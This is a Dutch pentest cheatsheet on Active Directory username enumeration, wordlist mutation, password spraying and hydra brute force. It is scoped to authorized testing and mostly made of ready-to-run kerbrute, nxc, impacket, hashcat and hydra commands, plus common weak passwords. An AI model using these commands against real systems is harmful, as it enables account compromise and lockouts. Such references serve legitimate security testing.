---
title: "Brute force & gebruikersnaam-enumeratie"
date: 2026-05-31
updated: 2026-05
lang: "nl"
permalink: /nl/cheatsheets/brute-force/
alt_url: "/cheatsheets/brute-force/"
tags: [active-directory, password-spray, username-enumeration, wordlists, kerberos]
summary: >-
  Gebruikersnaam-enumeratie, wordlist-voorbereiding en password spraying
  voor geautoriseerde AD-opdrachten — opgebouwd rond het
  domein-wachtwoordbeleid als de grens die het veilig houdt.
---

> Scope: alleen voor **geautoriseerd** testen. Sprayen zonder eerst de
> lockout-drempel van het domein te kennen, zet echte accounts op slot.
> Werk ze in deze volgorde af.

## 1. Domein-wachtwoordbeleid — lees dit eerst

De lockout-drempel en het reset-venster in het beleid zijn wat voorkomt
dat een spray een denial-of-service wordt. Enumerate dit altijd vóór
elke spray.

```bash
nxc smb <dc-ip> -u <user> -p '<password>' -d <domain> --pass-pol
```

Op verkeerd geconfigureerde domeinen kan een null-sessie werken — probeer
`-u '' -p ''` voordat je credentials hebt.

## 2. Gebruikersnaam-enumeratie

### Kandidaten genereren uit een namenlijst

Heb je een lijst met echte namen (LinkedIn-scrape, bedrijfswebsite,
deelnemerslijst van een congres), genereer dan gebruikersnamen volgens de
conventies die de doelmap waarschijnlijk hanteert:

```bash
./username-anarchy --input-file ./names.txt --select-format first.last
```

Veelgebruikte formaten om achter elkaar te proberen: `first.last`, `flast`,
`firstl`, `f.last`, `firstlast`.

### Kerberos pre-auth-enumeratie

Het AS-REQ-antwoord van Kerberos verschilt voor geldige en ongeldige
gebruikersnamen — je hebt geen credentials nodig. `kerbrute` is de
huidige standaard:

```bash
kerbrute userenum --dc <dc-ip> -d <domain> users.txt
```

Of de nmap NSE-variant:

```bash
nmap -p 88 --script krb5-enum-users \
     --script-args krb5-enum-users.realm='<domain>' <dc-ip>
```

### RID-brute via SAMR

Kun je SMB bereiken met een account (zelfs gast), loop dan de RIDs af:

```bash
nxc smb <dc-ip> -u <user> -p '<password>' --rid-brute
```

### AS-REP-roasting-kandidaten

Gebruikers met *Do not require Kerberos pre-authentication* geven een
AS-REP terug die je offline kunt kraken. Vraag in één keer hashes op voor
een lijst gebruikersnamen:

```bash
impacket-GetNPUsers <domain>/ -dc-ip <dc-ip> \
    -usersfile users.txt -format hashcat -outputfile asrep.hashes
```

## 3. Wordlist-voorbereiding

### Regelgebaseerde mutatie van een basislijst

Pas hashcat-rules toe om een basis-wordlist uit te breiden voordat je gaat
sprayen:

```bash
hashcat --stdout /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule > custom.txt
```

`best64.rule` is een snelle winst. `dive.rule` is agressiever en lawaaiiger
— bruikbaar voor offline kraken, overkill voor sprayen.

### Kandidaten scrapen van de site van het doel

Haal woorden van een publiek toegankelijke site voor een doelgerichte
wordlist — productnamen, slogans, namen van oprichters, jaartallen:

```bash
cewl https://target.example -w site-words.txt   # words to file
cewl https://target.example -e -n                # extract emails, no count
```

### Eigen hashcat-rules

Stapel mutaties zoals hoofdletters en achtervoegsels met jaar of symbool:

```
c $2 $0 $2 $6 $!
c $2 $0 $2 $6 $@
c $2 $0 $2 $6 $#
$S $u $m $m $e $r $2 $0 $2 $6
```

`c` zet het eerste teken in een hoofdletter. `$X` plakt de letterlijke X
eraan vast. Volledige referentie:
<https://hashcat.net/wiki/doku.php?id=rule_based_attack>

Test je rule op een kleine wordlist voordat je op schaal gaat:

```bash
hashcat --stdout ./wordlist -r ./custom.rule
```

## 4. Password spraying

**Veiligheidsregels.** Eén wachtwoord per ronde over de hele
gebruikerslijst. Wacht daarna buiten het reset-venster van de lockout
voordat je de volgende ronde doet. Draai **nooit** een wordlist tegen één
AD-gebruiker — dat is brute force en zet het account op slot.

### Kerberos-spray (meestal stiller dan SMB)

```bash
kerbrute passwordspray --dc <dc-ip> -d <domain> users.txt 'Spring2026!'
```

### SMB-spray

```bash
nxc smb <dc-ip> -u ./users.txt -p 'Spring2026!' \
    --no-bruteforce --continue-on-success
```

`--no-bruteforce` koppelt elke gebruiker aan het *zelfde* wachtwoord (1:1)
in plaats van elke gebruiker × elk wachtwoord. `--continue-on-success`
gaat door na een treffer, zodat je andere geldige accounts niet mist.

### PowerShell-variant (vanaf een domein-joined host)

```powershell
Invoke-DomainPasswordSpray -Password 'Spring2026!' -OutFile output.txt
```

### Kandidaten die de moeite waard zijn

`Welcome1`, `Welcome01`, `<Season><Year>!` (bijv. `Spring2026!`),
`<CompanyName>123`, `Password123`. Combineer met het beleid dat je in
stap 1 las om te weten hoeveel rondes je lockout-budget toelaat.

## 5. Brute force op één gebruiker

Als je een gebruikersnaam en een dienst hebt om aan te vallen (FTP, SSH,
één weblogin) — niet voor AD-accounts, tenzij de lockout expliciet uit
staat.

```bash
hydra -l <user> -P passlist.txt ftp://<target>
```

### Webformulier

```bash
hydra -L users.txt -P passwords.txt -f <target> -s <port> \
    http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

`F=...` is de faalmarkering die de server teruggeeft bij een verkeerde
poging. Stel hem af op wat het doel echt teruggeeft als de login mislukt.
